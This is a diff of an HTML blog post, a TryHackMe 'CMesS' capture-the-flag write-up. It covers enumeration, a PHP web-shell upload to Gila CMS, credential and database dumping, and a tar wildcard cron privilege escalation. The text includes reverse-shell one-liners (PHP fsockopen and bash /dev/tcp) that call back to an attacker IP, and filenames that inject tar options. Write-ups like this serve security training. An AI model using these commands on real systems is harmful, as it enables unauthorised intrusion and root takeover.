@@ -6,30 +6,31 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
 <title>TryHackMe - CMesS Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="TryHackMe - CMesS Writeup" />
       <meta property="og:description" content="A linux machine running Gila CMS having subdomains. Privesc using wildcard tar cronjob" />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/tryhackme_cmess/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/tryhackme_cmess/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,61 +40,84 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#tryhackme---cmess-writeup">TryHackMe - CMesS Writeup</a></li>
-    <li><a href="#nmap-scan">Nmap Scan</a></li>
-    <li><a href="#enumeration">Enumeration</a>
-    <ul>
-    <li><a href="#gobuster-fuzzing">Gobuster fuzzing</a></li>
-    <li><a href="#fuzzing-for-subdomains">Fuzzing for subdomains</a></li>
-    <li><a href="#subdomain-contents">Subdomain Contents:</a></li>
-    <li><a href="#gila-admin-login">Gila Admin Login</a></li>
-    <li><a href="#www-data-shell">www-data shell</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a>
-    <ul>
-    <li><a href="#gila-config.php">gila config.php</a></li>
-    <li><a href="#mysql-database-dump">MySQL database dump</a></li>
-    <li><a href="#user-andre-backup">User andre backup</a></li>
-    <li><a href="#ssh-login">SSH login</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---root">Privilege Escalation - root</a>
-    <ul>
-    <li><a href="#enumeration-1">Enumeration</a></li>
-    <li><a href="#crontab-tar-exploit">Crontab tar exploit</a></li>
-    </ul></li>
-    </ul>
-</nav>
+<ul>
+<li><a href="#tryhackme---cmess-writeup">TryHackMe - CMesS
+Writeup</a></li>
+<li><a href="#nmap-scan">Nmap Scan</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#gobuster-fuzzing">Gobuster fuzzing</a></li>
+<li><a href="#fuzzing-for-subdomains">Fuzzing for subdomains</a></li>
+<li><a href="#subdomain-contents">Subdomain Contents:</a></li>
+<li><a href="#gila-admin-login">Gila Admin Login</a></li>
+<li><a href="#www-data-shell">www-data shell</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---user">Privilege Escalation -
+User</a>
+<ul>
+<li><a href="#gila-config.php">gila config.php</a></li>
+<li><a href="#mysql-database-dump">MySQL database dump</a></li>
+<li><a href="#user-andre-backup">User andre backup</a></li>
+<li><a href="#ssh-login">SSH login</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---root">Privilege Escalation -
+root</a>
+<ul>
+<li><a href="#enumeration-1">Enumeration</a></li>
+<li><a href="#crontab-tar-exploit">Crontab tar exploit</a></li>
+</ul></li>
+</ul>
 <h1 id="tryhackme---cmess-writeup">TryHackMe - CMesS Writeup</h1>
 <h1 id="nmap-scan">Nmap Scan</h1>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out cmess.thm </span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out cmess.thm </span></code></pre></div>
 <p>Open ports:</p>
 <ul>
-<li>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) ssh-hostkey: 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)</li>
-<li>80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) http-generator: Gila CMS http-robots.txt: 3 disallowed entries /src/ /themes/ /lib/ http-title: Site doesn’t have a title (text/html; charset=UTF-8).</li>
+<li>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux;
+protocol 2.0) ssh-hostkey: 2048
+d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 256
+21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 256
+5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)</li>
+<li>80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) http-generator: Gila
+CMS http-robots.txt: 3 disallowed entries /src/ /themes/ /lib/
+http-title: Site doesn’t have a title (text/html; charset=UTF-8).</li>
 </ul>
 <h1 id="enumeration">Enumeration</h1>
 <p>Going to port 80, we find the Gila CMS home page</p>
 <p><img src="/img/tryhackme_cmess/100.png" /></p>
 <h2 id="gobuster-fuzzing">Gobuster fuzzing</h2>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gobuster</span> dir <span class="at">-u</span> http://cmess.thm/ <span class="at">-w</span> /usr/share/wordlists/dirb/common.txt</span></code></pre></div>
-<p>We got a lot of directories here. We get an <code>admin</code> login page for the <strong>Gila CMS</strong>.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gobuster</span> dir <span class="at">-u</span> http://cmess.thm/ <span class="at">-w</span> /usr/share/wordlists/dirb/common.txt</span></code></pre></div>
+<p>We got a lot of directories here. We get an <code>admin</code> login
+page for the <strong>Gila CMS</strong>.</p>
 <p><img src="/img/tryhackme_cmess/1.png" /></p>
 <h2 id="fuzzing-for-subdomains">Fuzzing for subdomains</h2>
-<p>Domains might containg subdomains hosting different contents. We can fuzz for the subdomains for example: <code>XYZ.cmess.thm</code> using <code>wfuzz</code> by bruting the <code>host</code> header. If a subdomain exists, we will get a page with different word counts than the domain most likely as its contents are different. So, we execute the following first to get the word count of the page we already got for domain “cmess.thm”</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wfuzz</span> <span class="at">-c</span> <span class="at">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="at">-u</span> http://cmess.thm <span class="at">-H</span> <span class="st">&quot;Host: FUZZ.cmess.thm&quot;</span></span></code></pre></div>
+<p>Domains might containg subdomains hosting different contents. We can
+fuzz for the subdomains for example: <code>XYZ.cmess.thm</code> using
+<code>wfuzz</code> by bruting the <code>host</code> header. If a
+subdomain exists, we will get a page with different word counts than the
+domain most likely as its contents are different. So, we execute the
+following first to get the word count of the page we already got for
+domain “cmess.thm”</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wfuzz</span> <span class="at">-c</span> <span class="at">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="at">-u</span> http://cmess.thm <span class="at">-H</span> <span class="st">&quot;Host: FUZZ.cmess.thm&quot;</span></span></code></pre></div>
 <p><img src="/img/tryhackme_cmess/2.png" /></p>
-<p>We get lot of success outputs and with the wordcount <code>290</code>. So this is the word count of the home page we got. Any existing subdomain should contain different number of words. So we can specify it using <code>--hw 290</code> which “Hide responses with the specified words”.</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wfuzz</span> <span class="at">-c</span> <span class="at">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="at">-u</span> http://cmess.thm <span class="at">-H</span> <span class="st">&quot;Host: FUZZ.cmess.thm&quot;</span> <span class="at">--hw</span> 290</span></code></pre></div>
+<p>We get lot of success outputs and with the wordcount
+<code>290</code>. So this is the word count of the home page we got. Any
+existing subdomain should contain different number of words. So we can
+specify it using <code>--hw 290</code> which “Hide responses with the
+specified words”.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">wfuzz</span> <span class="at">-c</span> <span class="at">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="at">-u</span> http://cmess.thm <span class="at">-H</span> <span class="st">&quot;Host: FUZZ.cmess.thm&quot;</span> <span class="at">--hw</span> 290</span></code></pre></div>
 <p><img src="/img/tryhackme_cmess/3.png" /></p>
-<p>And we get a subdomain <code>dev.cmess.htb</code>. We add it to our /etc/hosts file to the same IP address as of cmess.htb.</p>
+<p>And we get a subdomain <code>dev.cmess.htb</code>. We add it to our
+/etc/hosts file to the same IP address as of cmess.htb.</p>
 <h2 id="subdomain-contents">Subdomain Contents:</h2>
 <p>Browsing http://dev.cmess.thm, we find the following</p>
 <p><img src="/img/tryhackme_cmess/4.png" /></p>
-<p>It seems to be a chat between user andre and the support. And we get the email and password for the user andre which can be used for login in the cms</p>
+<p>It seems to be a chat between user andre and the support. And we get
+the email and password for the user andre which can be used for login in
+the cms</p>
 <p>Creds found:</p>
 <blockquote>
 <p>Email: andre@cmess.thm<br />
@@ -102,20 +126,30 @@ Password: KPFTN_f2yxe%</p>
 <h2 id="gila-admin-login">Gila Admin Login</h2>
 <p>We login to the the cms using our found creds</p>
 <p><img src="/img/tryhackme_cmess/5.png" /></p>
-<p>Looking around, we see that we have the ability to upload files to the machine at <code>Content -&gt; File Manager</code> option. We can upload a php-web-shell and get command execution on the box. We transfer our <a href="https://github.com/artyuum/Simple-PHP-Web-Shell/raw/master/index.php">php-web-shell.php</a> to the machine.</p>
+<p>Looking around, we see that we have the ability to upload files to
+the machine at <code>Content -&gt; File Manager</code> option. We can
+upload a php-web-shell and get command execution on the box. We transfer
+our <a
+href="https://github.com/artyuum/Simple-PHP-Web-Shell/raw/master/index.php">php-web-shell.php</a>
+to the machine.</p>
 <p><img src="/img/tryhackme_cmess/200.png" /></p>
-<p>Now we can go to the url <code>http://cmess.thm/assets/php-reverse-shell.php</code> and execute commands.</p>
+<p>Now we can go to the url
+<code>http://cmess.thm/assets/php-reverse-shell.php</code> and execute
+commands.</p>
 <p><img src="/img/tryhackme_cmess/6.png" /></p>
 <h2 id="www-data-shell">www-data shell</h2>
 <p>We try getting a reverse shell using php</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-r</span> <span class="st">&#39;$sock=fsockopen(&quot;10.9.17.253&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-r</span> <span class="st">&#39;$sock=fsockopen(&quot;10.9.17.253&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre></div>
 <p>On host</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 1234</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 1234</span></code></pre></div>
 <p>And we get a shell back as user www-data. We stabilize the shell.</p>
 <p><img src="/img/tryhackme_cmess/7.png" /></p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="gila-config.php">gila config.php</h2>
-<p>We find the file <code>config.php</code> under /var/www/html. The file has something interesting.</p>
+<p>We find the file <code>config.php</code> under /var/www/html. The
+file has something interesting.</p>
 <p><img src="/img/tryhackme_cmess/8.png" /></p>
 <p>We find the db creds for root.</p>
 <p>DB creds found:</p>
@@ -124,41 +158,62 @@ Password: KPFTN_f2yxe%</p>
 pass : r0otus3rpassw0rd</p>
 </blockquote>
 <h2 id="mysql-database-dump">MySQL database dump</h2>
-<p>We can dump the entire mysql database using the root creds we found using</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysqldump</span> <span class="at">-uroot</span> <span class="at">-pr0otus3rpassw0rd</span> <span class="at">--all-databases</span> <span class="op">&gt;</span> all_databases.sql</span></code></pre></div>
-<p>Having a throrogh look at the dump file, we find a hash for the user “andre”</p>
+<p>We can dump the entire mysql database using the root creds we found
+using</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysqldump</span> <span class="at">-uroot</span> <span class="at">-pr0otus3rpassw0rd</span> <span class="at">--all-databases</span> <span class="op">&gt;</span> all_databases.sql</span></code></pre></div>
+<p>Having a throrogh look at the dump file, we find a hash for the user
+“andre”</p>
 <p><img src="/img/tryhackme_cmess/9.png" /></p>
 <blockquote>
 <p>User: andre<br />
-Password: $2y<span class="math inline">10</span>uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa</p>
+Password: $2y<span
+class="math inline">10</span>uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa</p>
 </blockquote>
-<p>Looking at hashcat example hashes, we find that this hash is blowfish hash. We try cracking the hash using hashcat.</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"></code></pre></div>
+<p>Looking at hashcat example hashes, we find that this hash is blowfish
+hash. We try cracking the hash using hashcat.</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"></code></pre></div>
 <h2 id="user-andre-backup">User andre backup</h2>
-<p>Looking around, we find an interesting file .password.bak under /opt. The file contains</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>andres backup password</span>
+<p>Looking around, we find an interesting file .password.bak under /opt.
+The file contains</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode txt"><code class="sourceCode default"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>andres backup password</span>
 <span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>UQfsdCB7aAP6</span></code></pre></div>
 <h2 id="ssh-login">SSH login</h2>
-<p>Using the found backup password, we login using ssh to get the user.txt.</p>
+<p>Using the found backup password, we login using ssh to get the
+user.txt.</p>
 <p><img src="/img/tryhackme_cmess/10.png" /></p>
 <h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
 <h2 id="enumeration-1">Enumeration</h2>
-<p>Copying linpeas.sh over to the target, we run it. Linpeas shows us some interesting cron jobs</p>
+<p>Copying linpeas.sh over to the target, we run it. Linpeas shows us
+some interesting cron jobs</p>
 <p><img src="/img/tryhackme_cmess/11.png" /></p>
-<p>linpeas marks it as 99% PE vector. We see that the cron job backups everyting under the folder <code>/home/andre/backup</code> to the /tmp folder as a tar. For tar ing the files, it uses wildcard. Googling for a bit, we find that this wildcard can be exploited.</p>
+<p>linpeas marks it as 99% PE vector. We see that the cron job backups
+everyting under the folder <code>/home/andre/backup</code> to the /tmp
+folder as a tar. For tar ing the files, it uses wildcard. Googling for a
+bit, we find that this wildcard can be exploited.</p>
 <h2 id="crontab-tar-exploit">Crontab tar exploit</h2>
-<p>This exploit has been very well explained in <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation">hackingarticles.in</a></p>
-<p>The tar privesc is also found in <a href="https://gtfobins.github.io/gtfobins/tar/#shell">gtfobins</a> though it needs to be changed for our use.</p>
-<p>Following the exploit, we write a script shell.sh that gives us a reverse shell</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
+<p>This exploit has been very well explained in <a
+href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation">hackingarticles.in</a></p>
+<p>The tar privesc is also found in <a
+href="https://gtfobins.github.io/gtfobins/tar/#shell">gtfobins</a>
+though it needs to be changed for our use.</p>
+<p>Following the exploit, we write a script shell.sh that gives us a
+reverse shell</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-i</span> <span class="op">&gt;&amp;</span> /dev/tcp/10.9.17.253/1337 <span class="dv">0</span><span class="op">&gt;&amp;</span><span class="dv">1</span></span></code></pre></div>
 <p>Then we execute the following</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;&quot;</span> <span class="op">&gt;</span> <span class="st">&quot;--checkpoint-action=exec=bash shell.sh&quot;</span></span>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;&quot;</span> <span class="op">&gt;</span> <span class="st">&quot;--checkpoint-action=exec=bash shell.sh&quot;</span></span>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;&quot;</span> <span class="op">&gt;</span> --checkpoint=1</span></code></pre></div>
 <p>On the host, we open a nc listener and wait</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 1337</span></code></pre></div>
-<p>And after a bit, we get our root shell and can read the root.txt under /root</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 1337</span></code></pre></div>
+<p>And after a bit, we get our root shell and can read the root.txt
+under /root</p>
 <p><img src="/img/tryhackme_cmess/12.png" /></p>
 </article>
 
